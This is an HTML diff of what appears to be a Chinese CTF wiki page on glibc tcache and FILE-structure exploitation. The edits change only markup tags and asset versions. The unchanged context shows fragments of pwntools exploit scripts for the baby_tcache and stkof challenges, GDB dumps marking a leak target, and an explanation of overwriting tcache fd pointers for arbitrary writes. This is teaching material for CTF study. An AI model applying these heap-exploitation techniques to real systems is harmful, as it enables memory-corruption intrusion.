@@ -6840,7 +6840,7 @@ gdb-peda$ x/20xg 0x00007fa8a0a40700
 0x7fa8a0a40700 &lt;_IO_2_1_stderr_+128&gt;:   0x0000000000000000  0x00007fa8a0a418b0 (leak target)
 0x7fa8a0a40710 &lt;_IO_2_1_stderr_+144&gt;:   0xffffffffffffffff  0x0000000000000000
 0x7fa8a0a40720 &lt;_IO_2_1_stderr_+160&gt;:   0x00007fa8a0a3f780  0x0000000000000000
-</pre></div>
+</code></pre></div>
 
 <ul>
 <li>文件结构体更改缘由</li>
@@ -6851,7 +6851,7 @@ gdb-peda$ x/20xg 0x00007fa8a0a40700
 <p>完整 exp</p>
 </li>
 </ul>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./baby_tcache&#39;</span><span class="p">),</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;LD_PRELOAD&quot;</span><span class="p">:</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">})</span>
 
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">)</span>
@@ -6905,7 +6905,7 @@ gdb-peda$ x/20xg 0x00007fa8a0a40700
 
 <span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
     <span class="n">exp</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h5 id="challenge-2">Challenge 2 小结<a class="headerlink" href="#challenge-2" title="Permanent link">&para;</a></h5>
 <p>这个程序的利用过程是一个有用的技巧，这种通过文件结构体的方式来实现内存的读写的相关资料可以参考台湾 Angelboy 的博客。在 hctf2018 steak 中，也存在一个信息泄露的问题，大多数人采用了 copy puts_addr 到 <code>__free_hook</code> 指针里实现信息泄露，但实际上也可以通过修改文件结构体的字段来实现信息泄露。</p>
@@ -6914,7 +6914,7 @@ gdb-peda$ x/20xg 0x00007fa8a0a40700
 <p>参见<a href="../unlink-zh/#2014 HITCON stkof">unlink HITCON stkof 简介</a></p>
 <h5 id="libc-226-tcache">libc 2.26 tcache 利用方法<a class="headerlink" href="#libc-226-tcache" title="Permanent link">&para;</a></h5>
 <p>本题可以溢出较长字节，因此可以覆盖 chunk 的 fd 指针，在 libc 2.26 之后的 tcache 机制中，未对 fd 指针指向的 chunk 进行 size 检查，从而可以将 fd 指针覆盖任意地址。在 free 该被溢出 chunk 并且两次 malloc 后可以实现任意地址修改：</p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">GdbWrapper</span> <span class="kn">import</span> <span class="n">GdbWrapper</span>
 <span class="kn">from</span> <span class="nn">one_gadget</span> <span class="kn">import</span> <span class="n">generate_one_gadget</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&quot;info&quot;</span>
@@ -7040,7 +7040,7 @@ gdb-peda$ x/20xg 0x00007fa8a0a40700
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
     <span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./bins/a679df07a8f3a8d590febad45336d031-stkof&quot;</span>
     <span class="n">main</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="0x06">0x06 建议习题：<a class="headerlink" href="#0x06" title="Permanent link">&para;</a></h3>
 <ul>
@@ -7147,7 +7147,7 @@ gdb-peda$ x/20xg 0x00007fa8a0a40700
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -7162,7 +7162,7 @@ gdb-peda$ x/20xg 0x00007fa8a0a40700
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
